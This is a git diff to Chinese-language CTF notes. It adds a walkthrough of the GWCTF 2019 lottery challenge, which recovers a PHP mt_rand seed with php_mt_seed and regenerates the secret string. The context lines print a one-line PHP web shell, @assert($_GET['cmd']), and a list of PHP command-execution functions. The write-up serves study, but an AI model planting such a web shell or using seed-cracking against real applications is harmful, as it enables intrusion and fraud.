@@ -3413,7 +3413,7 @@ url解码之后就是 `?code=phpinfo();`
     <?php
     @assert($_GET["cmd"]);
     ?>
-    
+
     php执行系统命令：
     //shell_exec函数可执行但需要加echo才能显示结果
     shell_exec("ls")
@@ -3441,3 +3441,108 @@ url解码之后就是 `?code=phpinfo();`
     proc_open()
     `ls`
     ```
+
+## GWCTF 2019 枯燥的抽奖(伪随机数爆破)
+
+**本题会用到一个爆破工具 php_mt_seed, 用来爆破生成随机数的种子**
+
+[php_mt_seed Document](https://www.openwall.com/php_mt_seed/README)
+
+1. 源码
+
+    ```php
+    Hg11vtADEm
+    <?php
+    #这不是抽奖程序的源代码！不许看！
+    header("Content-Type: text/html;charset=utf-8");
+    session_start();
+    if(!isset($_SESSION['seed'])){
+    $_SESSION['seed']=rand(0,999999999);
+    }
+
+    mt_srand($_SESSION['seed']);
+    $str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    $str='';
+    $len1=20;
+    for ( $i = 0; $i < $len1; $i++ ){
+        $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+    }
+    $str_show = substr($str, 0, 10);
+    echo "<p id='p1'>".$str_show."</p>";
+
+
+    if(isset($_POST['num'])){
+        if($_POST['num']===$str){x
+            echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
+        }
+        else{
+            echo "<p id=flag>没抽中哦，再试试吧</p>";
+        }
+    }
+    show_source("check.php"); 
+
+    ```
+
+2. 审计源码可以看到字符串是通过一个随机数生成器生成的，然后查了下这个mt_srand()函数，果然存在漏洞
+
+    **mt_srand()函数**的作用是给随机数发生器播种，播种会初始化随机数生成器。语法为mt_srand(seed)，其seed参数为必须。大多数随机数生成器都需要初始种子。在PHP中，因为自动完成，所以mt_srand()函数的使用是可选的。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。播种后mt_rand函数就能使用Mersenne Twister算法生成随机整数。
+
+    但是用这个函数时会存在一些问题，每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种,(播种是由mt_srand()函数完成的)，当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下随机生成的随机数值是相同的。同时，也解释了我们破解随机种子的可行性。如果每次调用mt_rand()函数都需要生成一个随机种子的话，那根本就没办法破解。
+
+    *所以：大致过程就明了了，我们根据已经给出的部分随机数，利用工具找出seed（种子），然后得到完整的随机数。*
+
+3. 爆破seed
+
+    - 将已知的部分伪随机数转化为php_mt_seed工具可以看懂的数据
+
+    ```php
+    <?php
+    $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    $target = 'oBQ5bGllcU';
+    for ($i = 0; $i < strlen($target); $i++){
+        echo strpos($source, $target[$i])." ".strpos($source, $target[$i])." "."0"." ".strlen($source)-1." ";
+    }
+    ?>
+    ```
+
+    - 爆破seed(用 php_mt_seed)
+
+    ```bash
+    xking@xking-Ubuntu:~/Downloads/php_mt_seed-4.0$ ./php_mt_seed 14 14 0 61 37 37 0 61 52 52 0 61 31 31 0 61 1 1 0 61 42 42 0 61 11 11 0 61 11 11 0 61 2 2 0 61 56 56 0 61 
+    Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xfc000000 - 0xffffffff, speed 1177.7 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
+    seed = 0x016e370f = 24000271 (PHP 7.1.0+)
+    Found 1, trying 0xfe000000 - 0xffffffff, speed 52.1 Mseeds/s 
+    Found 1
+    ```
+
+    得到seed值 `24000271`
+
+4. 爆破flag
+
+    *这一部要注意上面爆破seed时结果输出中的提示 PHP 7.1.0+,这表示，下面脚本运行环境要符合版本要求，否则是爆不出正确结果的*
+
+    ```php
+    <?php
+    $seed = 24000271;
+    mt_srand($seed);
+    $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    $target = 'oBQ5bGllcU';
+    $res = "";
+    $len = 20;
+
+    while(true){
+        for ($i = 0; $i < $len; $i++) {
+            $res .= substr($source, mt_rand(0, strlen($source) - 1), 1);
+        }
+        $front = substr($res, 0, 10);
+        if($front === 'oBQ5bGllcU'){
+            break;
+        }
+    }
+    echo $res;
+    ```
+    将得到的结果输入即可返回flag
